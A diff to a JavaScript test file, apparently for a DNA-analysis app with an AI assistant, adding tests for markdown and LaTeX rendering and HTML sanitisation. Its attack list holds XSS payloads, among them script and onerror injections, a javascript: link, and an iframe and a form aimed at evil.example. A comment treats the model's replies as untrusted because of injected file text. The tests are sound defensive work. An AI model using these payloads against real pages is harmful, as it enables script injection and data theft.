@@ -7,6 +7,8 @@ import { suggestDigests, excisionOptions } from "../src/suggest.js";
 import { parseAny, sequenceStats, ParseError, featuresCutBy } from "../src/genbank.js";
 import { LADDERS, PFGE_RUNS, laddersFor, sizeLabel, sizeWindow } from "../src/gel.js";
 import { searchSamples, searchNcbi, EXCLUDED } from "../src/dna-search.js";
+import { renderMarkdown, splitMath, configureSanitizer } from "../src/markdown.js";
+import { JSDOM } from "jsdom";
 
 let pass = 0, fail = 0;
 const check = (label, got, want) => {
@@ -258,6 +260,67 @@ const overlapping = [
 check("overlapping features both reported", featuresCutBy([50], overlapping).map((h) => h.label), ["a", "b"]);
 check("but the cut is counted once",
   new Set(featuresCutBy([50], overlapping).flatMap((h) => h.cuts)).size, 1);
+
+// --- Assistant markdown and LaTeX -------------------------------------------
+{
+  // jsdom, not linkedom: DOMPurify needs document.implementation and
+  // NodeFilter, which linkedom does not provide. Handed something unusable it
+  // returns a passthrough rather than failing, so a half-shimmed DOM would
+  // report a green sanitiser that does nothing.
+  const { window } = new JSDOM("<!doctype html><html><body></body></html>");
+  check("the test DOM actually supports sanitising", configureSanitizer(window), true);
+
+  // Math comes out before markdown runs, or `*` and `_` inside a formula are
+  // eaten as emphasis.
+  const m = splitMath("size is $a_i \\times b^2$ and $$\\frac{n}{2}$$ done");
+  check("math is extracted, not left inline", /\$/.test(m.text), false);
+  check("both expressions captured", m.math.map((x) => x.display), [true, false]);
+  check("display math keeps its LaTeX", m.math[0].tex, "\\frac{n}{2}");
+
+  // Currency must not be mistaken for math, or ordinary prose breaks.
+  check("prices are not formulas", splitMath("costs $5 to $10 per reaction").math, []);
+  check("a lone dollar is left alone", splitMath("$ is not math").math, []);
+
+  const md = renderMarkdown("**bold** and `code`\n\n- one\n- two");
+  check("markdown renders", [/<strong>bold<\/strong>/.test(md), /<code>code<\/code>/.test(md),
+                             /<li>one<\/li>/.test(md)], [true, true, true]);
+
+  const tex = renderMarkdown("The rate is $E = mc^2$.");
+  check("LaTeX renders to MathML", /<math/.test(tex), true);
+  // KaTeX's default HTML output writes inline style attributes, which VIRGE's
+  // CSP (style-src 'self') blocks. MathML output writes none — that is the
+  // whole reason for the output setting, so it is pinned.
+  check("no inline styles reach the page", /style=/.test(tex), false);
+  // KaTeX wraps its output in <semantics> with an <annotation> holding the
+  // source TeX. DOMPurify drops those tags but keeps their text, so the raw
+  // LaTeX printed as a second line under every rendered equation.
+  const disp = renderMarkdown("$$\\frac{\\log_{10}(S)}{2}$$");
+  check("the source TeX is not echoed beside the rendered maths",
+    /\\frac|\\log/.test(disp), false);
+  check("but the equation is still there", /<math/.test(disp), true);
+
+  check("a broken formula degrades to its source, not to nothing",
+    /\\frac\{/.test(renderMarkdown("$\\frac{$")) || /<code>/.test(renderMarkdown("$\\frac{$")), true);
+
+  // The reply is not trusted: the model has just read a GenBank file the user
+  // dropped in, whose labels and definitions are someone else's text.
+  const attacks = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<a href=\"javascript:alert(1)\">click</a>",
+    "<iframe src=\"https://evil.example\"></iframe>",
+    "<div style=\"position:fixed;inset:0\">overlay</div>",
+    "<form action=\"https://evil.example\"><input name=key></form>",
+  ];
+  for (const a of attacks) {
+    const out = renderMarkdown(a);
+    check(`sanitised: ${a.slice(0, 28)}`,
+      /<script|onerror|javascript:|<iframe|<form|<input|style=/i.test(out), false);
+  }
+  // Sanitising must not be so aggressive that ordinary links stop working.
+  check("plain links survive", /href="https:\/\/example\.com"/.test(
+    renderMarkdown("[x](https://example.com)")), true);
+}
 
 // --- Finding DNA by name ----------------------------------------------------
 const find = (q) => searchSamples(q, SAMPLES);
